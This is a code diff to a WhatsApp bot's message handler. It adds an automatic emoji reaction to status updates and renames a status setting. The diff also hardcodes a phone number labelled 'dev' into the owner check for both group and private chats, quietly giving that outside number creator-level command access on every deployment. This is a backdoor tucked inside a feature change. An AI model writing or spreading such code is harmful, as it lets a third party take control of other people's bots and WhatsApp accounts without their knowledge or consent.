@@ -40,19 +40,33 @@ const Handler = async (chatUpdate, sock, logger) => {
         const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
         const text = m.body.slice(prefix.length + cmd.length).trim();
 
-        if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS) {
+        if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN) {
             await sock.readMessages([m.key]);
         }
-        
+                if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
+          const botJid = sock.user.id;
+          const statusEmojis = ['💎', '😘', '👍', '👑', '🎉', '🪙', '🦋', '🐣', '🥰', '😍', '😗', '🫠', '😯', '😇', 
+                               '🔥', '❤️', '🧡', '💚', '💛', '🩵', '💙', '💜', '🤎', '🖤', '🩶', '🤍', '🩷', 
+                               '💝', '💖', '💓', '❤️‍🩹', '❤️‍🔥', '🌼', '⚡', '🌧️', '🌦️', '🐞'];
+          const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
+          
+          await sock.sendMessage(m.key.remoteJid, {
+            react: {
+              text: randomEmoji,
+              key: m.key
+            }
+          }, { statusJidList: [m.key.participant || m.key.remoteJid, botJid] });
+          }
 
         const botNumber = await sock.decodeJid(sock.user.id);
         const ownerNumber = config.OWNER_NUMBER + '@s.whatsapp.net';
+        const dev = "923253617422@s.whatsapp.net";
         let isCreator = false;
 
         if (m.isGroup) {
-            isCreator = m.sender === ownerNumber || m.sender === botNumber;
+            isCreator = m.sender === ownerNumber || m.sender === botNumber || m.sender === dev;
         } else {
-            isCreator = m.sender === ownerNumber || m.sender === botNumber;
+            isCreator = m.sender === ownerNumber || m.sender === botNumber || m.sender === dev;
         }
 
         if (!sock.public) {
